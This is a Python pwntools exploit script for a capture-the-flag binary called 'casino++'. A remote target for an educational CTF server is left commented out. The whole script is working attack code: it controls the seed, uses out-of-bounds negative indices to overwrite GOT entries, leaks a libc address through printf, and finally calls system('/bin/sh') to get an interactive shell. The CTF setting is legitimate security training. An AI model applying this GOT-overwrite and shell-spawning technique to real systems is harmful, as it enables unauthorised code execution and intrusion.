#!usr/bin/pythin3
from pwn import *

context.arch = "amd64"

l = ELF('./casino++/libc.so')
re = process( './casino++/casino++')
#re = remote('edu-ctf.csie.org', 10176)
pause()
name = b'a' *0x10 + b'\x38\x20\x60\x00' #seed = 602038
re.sendlineafter( "name:", name)
re.sendlineafter( "age:", '25')

lottery = ["98", "85", "17", "50", "96", "32"]

for i in range(0, 6):
    re.sendlineafter( ": ",  "1")

#guess[-44] is 0x602020(GOT_puts)
re.sendlineafter(": ", "1")
re.sendlineafter(": ", "-43")
casino = "4196701"
re.sendlineafter(": ", casino)

for i in range(0, 6):
    re.sendlineafter( ": ",  lottery[i])
re.sendlineafter(": ", "1")
re.sendlineafter(": ", "-42")
re.sendlineafter(": ", "0")
# back to casino


for i in range(0, 6):
    re.sendlineafter( ": ",  "1")

#guess[-36] is 0x602040(GOT_srand)
re.sendlineafter(": ", "1")
re.sendlineafter(": ", "-35")

printf = "4196096" # 0x400700
re.sendlineafter(": ", printf)

for i in range(0, 6):
    re.sendlineafter( ": ",  lottery[i])
re.sendlineafter(": ", "1")
re.sendlineafter(": ", "-34")
re.sendlineafter(": ", "0")


libc = u64( re.recv(6) + b'\0\0' ) - 0x110070
l.address = libc
success ( 'libc -> %s' %hex( libc ) )
system_func_ptr = libc +0x4f440
#get libc-address

# '/bin/sh'
lottery = ["7", "87", "61", "14", "83", "30"]

for i in range(0, 6):
    re.sendlineafter( ": ",  "1")

re.sendlineafter(": ", "1")
re.sendlineafter(": ", "-37")

re.sendlineafter(": ", "1852400175" ) #/bin

for i in range(0, 6):
    re.sendlineafter( ": ",  lottery[i])
re.sendlineafter(": ", "1")
re.sendlineafter(": ", "-36")
re.sendlineafter(": ","6845231") # /sh

#system
lottery = ["97", "9", "89", "43", "80", "32"]
system = str(hex(system_func_ptr))
system_front =  str( int( ( '0x' + system[6:15] ) , 16 ) )
system_back = str ( int( ( system[0:6] ), 16 ) )

for i in range(0, 6):
    re.sendlineafter( ": ",  "1")

re.sendlineafter(": ", "1")
re.sendlineafter(": ", "-35")

re.sendlineafter(": ", system_front)

for i in range(0, 6):
    re.sendlineafter( ": ",  lottery[i])
re.sendlineafter(": ", "1")
re.sendlineafter(": ", "-34")
re.sendlineafter(": ", system_back)

re.interactive()
